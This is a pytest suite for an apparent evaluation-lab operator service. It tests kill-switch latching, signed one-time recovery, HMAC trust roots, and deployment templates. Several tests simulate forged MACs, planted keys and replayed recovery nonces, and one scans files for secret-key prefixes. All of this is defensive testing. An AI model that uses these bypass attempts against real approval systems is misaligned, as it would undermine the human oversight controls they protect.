    assert refused.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"
    _write_auths(state, recovery_actor=ENABLE)
    same = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
    assert same.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"
    _settle_kill(state)
    _write_auths(state, recovery_actor=RECOVERY)
    recovered = _run(tmp_path, "recover", policy=policy, env=env, now=NOW)
    assert recovered.returncode == 0
    assert (state / "mode").read_text().strip() == "DISABLED"


def test_keychain_stdout_omits_ref_when_absent() -> None:
    injected = "keychain:not-a-valid"
    completed = subprocess.run(
        [str(KEYCHAIN)],
        cwd=ROOT,
        capture_output=True,
        text=True,
        env={**os.environ, "EVAL_LAB_SECRET_REF": injected},
    )
    assert completed.returncode == 2
    assert injected not in completed.stdout
    assert "EVAL_LAB_SECRET_REF" not in completed.stdout
    assert "secret_ref=" not in completed.stdout


def test_committed_templates_have_no_secret_literals() -> None:
    needles = ("sk-", "AKIA", "BEGIN PRIVATE", "-----BEGIN")
    for root in SECRET_SCAN_ROOTS:
        paths = [root] if root.is_file() else list(root.rglob("*"))
        for path in paths:
            if not path.is_file():
                continue
            text = path.read_text(encoding="utf-8", errors="ignore")
            for needle in needles:
                assert needle not in text, f"{path} contains {needle}"


def test_main_argv_matches_module(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    code = main(["validate", "--state-dir", str(tmp_path / "op")])
    assert code == 2

def test_user_json_is_not_trust_root(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    state.mkdir()
    shutil.copy2(STANDING, state / "standing-approvals.yaml")
    (state / "approval.json").write_text(
        json.dumps({"spec_id": SPEC_ID, "actor": APPROVAL, "authorized_at": NOW.isoformat(), "quota_override": False})
    )
    (state / "budget.json").write_text(
        json.dumps({**_budget_fields(), "spec_id": SPEC_ID, "actor": BUDGET, "authorized_at": NOW.isoformat(), "quota_override": False})
    )
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_forged_store_index_is_rejected(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    index = json.loads((state / "trust/index.json").read_text())
    index["mac"] = "0" * 64
    (state / "trust/index.json").write_text(json.dumps(index))
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_heartbeat_within_skew_is_accepted(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text((NOW + timedelta(seconds=HEARTBEAT_SKEW_SECONDS)).isoformat() + "\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW)
    assert result.returncode == 0


def test_heartbeat_beyond_skew_is_stale(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml", stale_after=300)
    state = tmp_path / "state"
    state.mkdir()
    (state / "heartbeat").write_text((NOW + timedelta(seconds=HEARTBEAT_SKEW_SECONDS + 1)).isoformat() + "\n")
    result = _run(tmp_path, "status", policy=policy, now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_STALE_HEARTBEAT


def test_rendered_templates_confine_writable_state() -> None:
    service = SERVICE.read_text()
    compose = COMPOSE.read_text()
    plist = plistlib.loads(PLIST.read_bytes())
    assert service.count("/var/lib/evallab-operator") >= 1
    assert "--state-dir /var/lib/evallab-operator" in service
    assert "StateDirectory=evallab-operator" in service
    assert "LoadCredential=evallab-approval-hmac:/root-managed/evallab-approval-hmac" in service
    assert not any(line.strip().startswith("LoadCredential=") for line in service.splitlines())
    assert "read_only: true" in compose
    assert "evallab-operator-state:/var/lib/evallab-operator" in compose
    assert plist["ProgramArguments"][-1] == LAUNCHD_STATE_TOKEN
    assert plist["StandardOutPath"].startswith(LAUNCHD_LOG_TOKEN)
    assert "~" not in PLIST.read_text()



def test_hmac_key_from_caller_env_or_state_file_is_ignored(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    (state / "trust.mac").write_bytes(MAC_KEY)
    env = {**_gate_env(), "EVAL_LAB_HMAC_KEY": MAC_KEY.decode(), "EVAL_LAB_TRUST_MAC_KEY": str(state / "trust.mac")}
    result = _run(tmp_path, "validate", policy=policy, env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_hmac_key_in_writable_state_is_ignored(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    planted = state / "evallab-hmac"
    planted.write_bytes(MAC_KEY)
    os.chmod(planted, 0o400)
    (tmp_path / "run-secrets" / PINNED_LINUX_SECRET_NAME).unlink(missing_ok=True)
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_kill_latch_survives_restart_replay(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    (state / "inflight.json").write_text(json.dumps([{"lease": "a", "fenced": True}]))
    killed = _run(tmp_path, "kill", now=NOW)
    assert killed.returncode == 0
    assert (state / "mode").read_text().strip() == "KILLED"
    replay = _run(tmp_path, "status", policy=policy, now=NOW)
    assert (state / "mode").read_text().strip() == "KILLED"
    assert _payload(replay)["mode"] == "KILLED"
    assert json.loads((state / "inflight.json").read_text())[0]["lease"] == "a"


def test_recovery_is_one_time_and_audited(tmp_path: Path) -> None:
    from evallab.ops_continuous import REASON_RECOVERY_SPENT

    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    _settle_kill(state)
    _write_auths(state, recovery_actor=RECOVERY)
    first = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert first.returncode == 0
    events = (state / "events.jsonl").read_text()
    assert RECOVERY_JTI in events
    assert '"one_time": true' in events
    spent = (state / "recovery-spent.jsonl").read_text()
    assert RECOVERY_JTI in spent
    assert (state / "mode").read_text().strip() == "DISABLED"
    _run(tmp_path, "kill", now=NOW)
    _settle_kill(state)
    dump = ContinuousLoopPolicy.model_validate(_policy_dump_for(state)).model_dump(mode="json")
    kill_digest = __import__("hashlib").sha256((state / "kill.json").read_bytes()).hexdigest()
    bound = recovery_settlement_binding(state) or ([], [])
    put_trusted_record(
        trust_root_for(state, {}),
        MAC_KEY,
        _trust_record(
            kind="recovery",
            actor=RECOVERY,
            nonce=RECOVERY_JTI,
            kill_digest=kill_digest,
            fenced_ids=bound[0],
            settlement_digests=bound[1],
        ),
        policy=dump,
        budget=_budget_fields(),
        kill_digest=kill_digest,
    )
    replay = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert replay.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"
    assert _payload(replay)["reason"] == REASON_RECOVERY_SPENT


def test_forged_recovery_template_without_jti_is_rejected(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    record = _trust_record(kind="recovery", actor=RECOVERY)
    record.pop("nonce", None)
    dump = _policy_dump_for(state)
    try:
        put_trusted_record(trust_root_for(state, {}), MAC_KEY, record, policy=dump, budget=_budget_fields())
    except ValueError:
        pass
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    result = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"


def test_rotate_logs_writes_0600_files_under_0700_dir(tmp_path: Path) -> None:
    state = tmp_path / "state"
    logs = state / "logs"
    logs.mkdir(parents=True)
    (logs / "continuous-operator.out").write_text("old\n")
    env = {**_gate_env(), "EVAL_LAB_OPERATOR_LOG_DIR": str(logs)}
    result = _run(tmp_path, "rotate-logs", env=env, now=NOW)
    assert result.returncode == 0
    assert oct(logs.stat().st_mode & 0o777) == "0o700"
    current = logs / "continuous-operator.out"
    assert current.is_file()
    assert oct(current.stat().st_mode & 0o777) == "0o600"
    rotated = list(logs.glob("continuous-operator.out.*"))
    assert rotated
    assert oct(rotated[0].stat().st_mode & 0o777) == "0o600"


def test_templates_reject_tmpfs_state_and_dev_null() -> None:
    compose = COMPOSE.read_text()
    plist = PLIST.read_text()
    service = SERVICE.read_text()
    assert "evallab-operator-state:/var/lib/evallab-operator" in compose
    assert "read_only: true" in compose
    assert "/tmp:mode=0700" in compose
    assert "/dev/null" not in plist
    assert "/dev/null" not in service
    assert "EVAL_LAB_RECOVERY_TOKEN" not in (ROOT / "src/evallab/ops_continuous.py").read_text()
    assert "EVAL_LAB_RECOVERY_TOKEN" not in (ROOT / "docs/continuous-loop-operator.md").read_text()


def test_budget_ceiling_must_be_positive(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, ceiling_usd=0)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_BUDGET


def test_budget_ceiling_above_standing_is_refused(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, ceiling_usd=21)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_BUDGET


def test_previous_hmac_key_is_accepted_during_rotation(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _install_hmac(tmp_path, key=PREV_KEY, previous=MAC_KEY)
    _write_auths(state, mac_key=MAC_KEY)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert result.returncode == 0


def test_eval_lab_approval_mac_key_env_is_not_trust_root(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    env = {**_gate_env(), "EVAL_LAB_APPROVAL_MAC_KEY": MAC_KEY.decode()}
    result = _run(tmp_path, "validate", policy=policy, env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL

def test_recover_refuses_unexecuted_kill_without_consuming_nonce(tmp_path: Path) -> None:
    from evallab.ops_continuous import REASON_DRAIN_INCOMPLETE

    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state, recovery_actor=RECOVERY)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    _write_auths(state, recovery_actor=RECOVERY)
    result = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
    assert (state / "mode").read_text().strip() == "KILLED"
    assert not (state / "nonces").exists() or not any((state / "nonces").iterdir())


def test_recover_refuses_inflight_without_consuming_nonce(tmp_path: Path) -> None:
    from evallab.ops_continuous import REASON_DRAIN_INCOMPLETE

    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    (state / "inflight.json").write_text(json.dumps(["lease-open"]) + "\n")
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    kill = json.loads((state / "kill.json").read_text())
    kill["executed"] = True
    (state / "kill.json").write_text(json.dumps(kill, indent=2, sort_keys=True) + "\n")
    (state / "inflight.json").write_text(json.dumps(["lease-open"]) + "\n")
    (state / "leases.json").write_text(json.dumps([{"id": "lease-open", "status": "settled"}]) + "\n")
    _write_auths(state, recovery_actor=RECOVERY)
    result = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
    assert (state / "mode").read_text().strip() == "KILLED"
    assert not (state / "nonces").exists() or not any((state / "nonces").iterdir())


def test_credentials_directory_0440_key_is_accepted(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    import evallab.ops_continuous as oc

    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    creds = tmp_path / "credentials"
    creds.mkdir()
    key = creds / PINNED_LINUX_SECRET_NAME
    key.write_bytes(MAC_KEY)
    os.chmod(key, 0o440)
    _write_auths(state)
    (tmp_path / "run-secrets" / PINNED_LINUX_SECRET_NAME).unlink(missing_ok=True)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    monkeypatch.setattr(oc, "_is_readonly_mount", lambda path: True)
    env = {**_gate_env(), "CREDENTIALS_DIRECTORY": str(creds)}
    result = _run(tmp_path, "validate", policy=policy, env=env, now=NOW)
    assert result.returncode == 0


def test_euid_writable_hmac_file_is_rejected(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    root = tmp_path / "run-secrets"
    root.mkdir()
    path = root / PINNED_LINUX_SECRET_NAME
    path.write_bytes(MAC_KEY)
    os.chmod(path, 0o600)
    _write_auths(state)
    os.chmod(path, 0o600)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_main_wires_keychain_resolver_when_store_omitted() -> None:
    import inspect

    source = inspect.getsource(main)
    assert "load_macos_keychain_secret" in source
    assert load_macos_keychain_secret("not-a-ref") is None


def test_launchd_installer_renders_absolute_macos_paths(tmp_path: Path) -> None:
    home = tmp_path / "home"
    dest = tmp_path / "rendered.plist"
    completed = subprocess.run(
        [str(INSTALLER), str(dest)],
        cwd=ROOT,
        capture_output=True,
        text=True,
        env={**os.environ, "EVAL_LAB_OPERATOR_HOME": str(home)},
    )
    assert completed.returncode == 0, completed.stderr
    assert "launchctl=skipped" in completed.stdout
    loaded = plistlib.loads(dest.read_bytes())
    state = (home / "Library/Application Support/EvalLab").resolve()
    logs = (home / "Library/Logs/EvalLab").resolve()
    assert loaded["ProgramArguments"][-1] == str(state)
    assert loaded["StandardOutPath"] == str(logs / "continuous-operator.out")
    assert oct(state.stat().st_mode & 0o777) == "0o700"
    assert oct(logs.stat().st_mode & 0o777) == "0o700"
    assert oct((logs / "continuous-operator.out").stat().st_mode & 0o777) == "0o600"
    assert not state.is_symlink()
    assert "~" not in dest.read_text()
    assert "/var/tmp/evallab-operator" not in dest.read_text()
    assert "KeepAlive" not in loaded

def test_pause_restart_do_not_overwrite_draining(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps({"lease": 1}))
    drained = _run(tmp_path, "drain", now=NOW)
    assert (state / "mode").read_text().strip() == "DRAINING"
    assert drained.returncode == 2
    for command in ("pause", "restart", "maintenance", "start", "validate"):
        result = _run(tmp_path, command, now=NOW)
        assert result.returncode == 2
        assert (state / "mode").read_text().strip() == "DRAINING"


def test_drain_then_signed_recovery_clears_killed(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-open"]))
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    assert json.loads((state / "kill.json").read_text())["executed"] is False
    drained = _run(tmp_path, "drain", now=NOW, owner=FakeOwner({"lease-open": _terminal_obs("lease-open")}))
    assert drained.returncode == 0
    assert json.loads((state / "kill.json").read_text())["executed"] is True
    assert json.loads((state / "inflight.json").read_text()) == []
    assert (state / "mode").read_text().strip() == "KILLED"
    _write_auths(state, recovery_actor=RECOVERY)
    recovered = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert recovered.returncode == 0
    assert (state / "mode").read_text().strip() == "DISABLED"

def test_caller_env_temp_key_and_arbitrary_credentials_path_are_ignored(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (tmp_path / "run-secrets" / PINNED_LINUX_SECRET_NAME).unlink()
    other = tmp_path / "tmp-key"
    other.write_bytes(MAC_KEY)
    os.chmod(other, 0o400)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    env = {
        **_gate_env(),
        "EVAL_LAB_HMAC_KEY": MAC_KEY.decode(),
        "CREDENTIALS_DIRECTORY": str(other),
    }
    result = _run(tmp_path, "validate", policy=policy, env=env, now=NOW)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_wrong_fingerprint_at_pinned_path_is_rejected(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    wrong_key = b"eval-lab-operator-mac-key-WRONG32b!"
    _install_hmac(tmp_path, key=wrong_key)
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    # Fixture trust store only allows MAC_KEY, not wrong_key
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW, trust_store=FixtureTrustStore([MAC_KEY]))
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_recover_missing_fenced_lease_fails_without_spending_nonce(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-missing"]) + "\n")
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    kill = json.loads((state / "kill.json").read_text())
    kill["executed"] = True
    (state / "kill.json").write_text(json.dumps(kill, indent=2, sort_keys=True) + "\n")
    (state / "inflight.json").write_text("[]\n")
    (state / "leases.json").write_text(json.dumps([{"id": "other", "status": "settled", "evidence": "x"}]) + "\n")
    _write_auths(state, recovery_actor=RECOVERY)
    result = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert _payload(result)["reason"] == REASON_DRAIN_INCOMPLETE
    assert (state / "mode").read_text().strip() == "KILLED"
    assert not (state / "nonces").exists() or not any((state / "nonces").iterdir())


def test_compose_init_image_is_digest_pinned() -> None:
    compose = COMPOSE.read_text()
    assert f"image: {PINNED_INIT_IMAGE}" in compose
    assert "busybox" not in compose
    assert compose.count("@sha256:") >= 1
    assert "evallab-approval-hmac" in compose


def test_policy_ref_must_equal_pinned_ref() -> None:
    assert PINNED_LINUX_REF == "file:/run/secrets/evallab-approval-hmac"
    assert PINNED_KEYCHAIN_REF.startswith("keychain:EvalLab/")
    assert LINUX_TRUST_MANIFEST_PATH == Path("/etc/evallab/trusted-approval-keys.json")

def test_drain_unknown_and_missing_leases_refuse(tmp_path: Path) -> None:
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-a", "lease-b"]))
    (state / "leases.json").write_text(json.dumps([{"id": "lease-a", "status": "running"}]))
    missing = _run(tmp_path, "drain", now=NOW, owner=FakeOwner({"lease-a": _terminal_obs("lease-a")}))
    assert missing.returncode == 2
    assert json.loads((state / "inflight.json").read_text()) == ["lease-a", "lease-b"]
    unknown = _run(tmp_path, "drain", now=NOW, owner=FakeOwner({"lease-a": _unknown_obs("lease-a"), "lease-b": _unknown_obs("lease-b")}))
    assert unknown.returncode == 2
    assert json.loads((state / "leases.json").read_text())[0]["status"] == "running"


def test_crash_between_views_keeps_killed_from_journal(tmp_path: Path) -> None:
    import evallab.ops_continuous as oc

    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    owner = FakeOwner({"lease-1": _terminal_obs("lease-1")})
    _run(tmp_path, "kill", now=NOW, owner=owner)
    assert (state / "mode").read_text().strip() == "KILLED"
    (state / "mode").write_text("DISABLED\n")
    (state / "kill.json").unlink()
    oc.recover_journal_views(state)
    assert (state / "mode").read_text().strip() == "KILLED"
    assert json.loads((state / "kill.json").read_text())["executed"] is False
    assert json.loads((state / "inflight.json").read_text()) == ["lease-1"]

def test_recovery_mac_rejects_synthetic_local_lease_digest(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    state.mkdir()
    original = [{"id": "lease-1", "status": "running", "evidence": {"pid_alive": True}}]
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    (state / "leases.json").write_text(json.dumps(original))
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    drained = _run(tmp_path, "drain", now=NOW, owner=FakeOwner({"lease-1": _terminal_obs("lease-1")}))
    assert drained.returncode == 0
    dump = ContinuousLoopPolicy.model_validate(_policy_dump_for(state)).model_dump(mode="json")
    kill_digest = hashlib.sha256((state / "kill.json").read_bytes()).hexdigest()
    synthetic = lease_settlement_digest(original[0])
    put_trusted_record(
        trust_root_for(state, {}),
        MAC_KEY,
        _trust_record(
            kind="recovery",
            actor=RECOVERY,
            kill_digest=kill_digest,
            fenced_ids=["lease-1"],
            settlement_digests=[synthetic],
        ),
        policy=dump,
        budget=_budget_fields(),
        kill_digest=kill_digest,
    )
    result = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert result.returncode == 2
    assert (state / "mode").read_text().strip() == "KILLED"


def test_launchd_rejects_symlink_ancestor(tmp_path: Path) -> None:
    from evallab.ops_continuous import render_launchd_plist

    home = tmp_path / "home"
    real_lib = tmp_path / "elsewhere"
    real_lib.mkdir(parents=True)
    home.mkdir(parents=True, exist_ok=True)
    (home / "Library").symlink_to(real_lib)
    dest = tmp_path / "rendered.plist"
    try:
        render_launchd_plist(PLIST, dest, home=home)
    except OSError:
        return
    raise AssertionError("expected symlink ancestor rejection")

def test_production_default_refuses_without_deployment_trust_manifest(tmp_path: Path) -> None:
    import evallab.ops_continuous as oc

    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    # Pass DeploymentTrustStore explicitly pointing to nonexistent manifest
    fake_manifest_path = tmp_path / "nonexistent-trusted-approval-keys.json"
    ds = oc.DeploymentTrustStore(manifest_path=fake_manifest_path)
    result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW, trust_store=ds)
    assert _payload(result)["reason"] == REASON_MISSING_STANDING_APPROVAL


def test_deployment_trust_store_loads_valid_manifest(tmp_path: Path) -> None:
    import evallab.ops_continuous as oc

    manifest = tmp_path / "trusted-approval-keys.json"
    manifest_data = {
        "active_key_id": key_id_for(MAC_KEY),
        "previous_key_id": key_id_for(PREV_KEY),
    }
    manifest.write_text(json.dumps(manifest_data, indent=2))
    os.chmod(manifest, 0o400)
    store = oc.DeploymentTrustStore(manifest_path=manifest)
    assert key_id_for(MAC_KEY) in store.allowed_key_ids()
    assert key_id_for(PREV_KEY) in store.allowed_key_ids()
    assert len(store.manifest_digest()) == 64


def test_recover_then_pause_maintenance_restart_take_effect_without_split_brain(tmp_path: Path) -> None:
    policy = _policy(tmp_path / "policy.yaml")
    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")
    _run(tmp_path, "kill", now=NOW)
    drained = _run(tmp_path, "drain", now=NOW, owner=FakeOwner({"lease-1": _terminal_obs("lease-1")}))
    assert drained.returncode == 0
    _write_auths(state, recovery_actor=RECOVERY)
    rec = _run(tmp_path, "recover", policy=policy, env=_gate_env(), now=NOW)
    assert rec.returncode == 0
    assert (state / "mode").read_text().strip() == "DISABLED"

    # Now pause must take effect in both journal snapshot and mode view
    paused = _run(tmp_path, "pause", now=NOW)
    assert paused.returncode == 0
    assert _payload(paused)["mode"] == "PAUSED"
    assert (state / "mode").read_text().strip() == "PAUSED"

    # Maintenance must take effect
    maint = _run(tmp_path, "maintenance", now=NOW)
    assert maint.returncode == 0
    assert _payload(maint)["mode"] == "MAINTENANCE"
    assert (state / "mode").read_text().strip() == "MAINTENANCE"

    # Restart must transition to DISABLED
    restarted = _run(tmp_path, "restart", now=NOW)
    assert restarted.returncode == 0
    assert _payload(restarted)["mode"] == "DISABLED"
    assert (state / "mode").read_text().strip() == "DISABLED"

def test_compose_container_trust_manifest_and_secret_loaded_by_uid_65532(tmp_path: Path) -> None:
    import evallab.ops_continuous as oc

    # Simulate container layout where manifest is at /etc/evallab/trusted-approval-keys.json
    # and secret is at /run/secrets/evallab-approval-hmac
    manifest_dir = tmp_path / "etc/evallab"
    manifest_dir.mkdir(parents=True)
    manifest_file = manifest_dir / "trusted-approval-keys.json"
    manifest_file.write_text(json.dumps({
        "active_key_id": key_id_for(MAC_KEY),
        "previous_key_id": key_id_for(PREV_KEY),
    }))
    os.chmod(manifest_file, 0o440)

    secrets_dir = tmp_path / "run/secrets"
    secrets_dir.mkdir(parents=True)
    secret_file = secrets_dir / oc.PINNED_LINUX_SECRET_NAME
    secret_file.write_bytes(MAC_KEY)
    os.chmod(secret_file, 0o440)

    state = tmp_path / "state"
    state.mkdir()
    _write_auths(state)
    (state / "heartbeat").write_text(NOW.isoformat() + "\n")

    policy = _policy(tmp_path / "policy.yaml")
    ds = oc.DeploymentTrustStore(manifest_path=manifest_file)
    
    # In container, both manifest and key are mode 0440 owned by 65532
    original_path = oc.PINNED_LINUX_SECRET_PATH
    oc.PINNED_LINUX_SECRET_PATH = secret_file
    try:
        result = _run(tmp_path, "validate", policy=policy, env=_gate_env(), now=NOW, trust_store=ds)
        assert result.returncode == 0
        assert _payload(result)["ok"] is True
    finally:
        oc.PINNED_LINUX_SECRET_PATH = original_path


def test_concurrent_pause_and_kill_cannot_lose_killed_latch(tmp_path: Path) -> None:
    import threading

    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    _write_auths(state)

    results = []

    def run_kill():
        res = _run(tmp_path, "kill", now=NOW, owner=FakeOwner({"lease-1": _terminal_obs("lease-1")}))
        results.append(("kill", res.returncode))

    def run_pause():
        res = _run(tmp_path, "pause", now=NOW)
        results.append(("pause", res.returncode))

    t1 = threading.Thread(target=run_kill)
    t2 = threading.Thread(target=run_pause)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    # Once kill runs, state must remain KILLED (never overwritten by pause)
    assert (state / "mode").read_text().strip() == "KILLED"


def test_concurrent_restart_and_drain_cannot_lose_killed_latch(tmp_path: Path) -> None:
    import threading

    state = tmp_path / "state"
    state.mkdir()
    (state / "inflight.json").write_text(json.dumps(["lease-1"]))
    _write_auths(state)
    _run(tmp_path, "kill", now=NOW)
    assert (state / "mode").read_text().strip() == "KILLED"

    def run_drain():
        _run(tmp_path, "drain", now=NOW, owner=FakeOwner({"lease-1": _terminal_obs("lease-1")}))

    def run_restart():
        _run(tmp_path, "restart", now=NOW)

    t1 = threading.Thread(target=run_drain)
    t2 = threading.Thread(target=run_restart)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    # After drain+restart on a killed node, mode must remain KILLED
    assert (state / "mode").read_text().strip() == "KILLED"

